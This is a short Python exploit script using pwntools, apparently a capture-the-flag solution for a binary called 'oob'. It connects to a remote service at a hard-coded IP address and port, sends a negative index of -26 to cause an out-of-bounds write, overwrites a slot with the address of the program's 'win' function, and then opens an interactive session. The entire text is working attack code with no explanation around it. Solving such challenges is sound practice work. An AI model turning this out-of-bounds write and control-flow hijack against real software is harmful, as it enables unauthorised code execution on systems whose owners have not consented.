from pwn import *
exe = ELF('oob')
p = remote("34.71.207.70", 1337)
p.sendlineafter(b"index: ", b'-26')
p.sendlineafter(b"value: ", str(exe.symbols['win']).encode())
print(p.recvline())
p.interactive()